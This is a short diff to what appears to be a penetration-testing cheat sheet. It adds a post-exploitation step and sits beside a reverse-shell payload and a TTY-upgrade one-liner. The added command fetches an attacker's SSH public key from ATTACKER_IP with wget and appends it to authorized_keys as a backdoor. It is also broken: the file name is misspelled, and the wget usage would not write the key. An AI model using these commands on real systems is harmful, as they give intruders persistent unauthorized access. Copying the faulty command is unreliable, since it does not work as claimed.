@@ -32,6 +32,9 @@ p=subprocess.call(["/bin/sh","-i"])*
 Post exploitation
     Get a TTY shell after a reverse shell connection
     *$ python -c 'import pty;pty.spawn("/bin/bash")'*
+    Add public key to authorized keys:
+    *$ echo $(wget https://ATTACKER_IP/.ssh/id_rsa.pub) >> ~/.ssh/authotized_keys*
+
 
 Escaping limited interpreters
     Some payloads to overcome limited shells:
